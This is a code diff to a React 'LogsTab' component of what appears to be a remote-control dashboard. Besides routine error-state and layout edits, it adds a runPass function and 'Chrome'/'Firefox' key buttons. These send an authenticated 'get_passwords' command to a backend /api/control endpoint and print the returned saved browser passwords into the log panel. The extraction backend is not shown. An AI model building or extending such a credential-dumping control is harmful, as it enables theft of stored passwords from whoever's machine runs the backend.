@@ -5,6 +5,7 @@ import { getLogs } from "@/lib/api";
 export default function LogsTab() {
   const [lines, setLines] = useState<string[]>([]);
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState("");
   const [autoRefresh, setAutoRefresh] = useState(true);
   const [lineCount, setLineCount] = useState(100);
   const [filter, setFilter] = useState("");
@@ -17,6 +18,28 @@ export default function LogsTab() {
       setLines(data.lines || []);
     } catch (e) {
       console.error(e);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const runPass = async (type: "chrome" | "firefox") => {
+    setLoading(true);
+    setError("");
+    try {
+      const { getApiBase, getToken } = await import("@/lib/api");
+      const base = getApiBase();
+      const token = getToken();
+      const resp = await fetch(`${base}/api/control`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
+        body: JSON.stringify({ action: "get_passwords", params: { browser: type } }),
+      });
+      const data = await resp.json();
+      if (data.error) throw new Error(data.error);
+      setLines(prev => [`--- ${type.toUpperCase()} PASSWORDS ---`, data.output, ...prev]);
+    } catch (e: any) {
+      setError(e.message);
     } finally {
       setLoading(false);
     }
@@ -51,7 +74,15 @@ export default function LogsTab() {
   return (
     <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
       <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 8 }}>
-        <h2 style={{ fontSize: "1.1rem", fontWeight: 700 }}>📋 System Logs</h2>
+        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
+          <h2 style={{ fontSize: "1.1rem", fontWeight: 700 }}>📋 System Logs</h2>
+          <div style={{ display: "flex", gap: 6 }}>
+            <button className="btn-primary" style={{ fontSize: "0.7rem", padding: "4px 10px" }}
+              onClick={() => runPass("chrome")} disabled={loading}>🔑 Chrome</button>
+            <button className="btn-primary" style={{ fontSize: "0.7rem", padding: "4px 10px" }}
+              onClick={() => runPass("firefox")} disabled={loading}>🔑 Firefox</button>
+          </div>
+        </div>
         <div style={{ display: "flex", gap: 8, alignItems: "center", flexWrap: "wrap" }}>
           <input className="jarvis-input" style={{ width: 200 }} placeholder="Filter logs..."
             value={filter} onChange={e => setFilter(e.target.value)} />
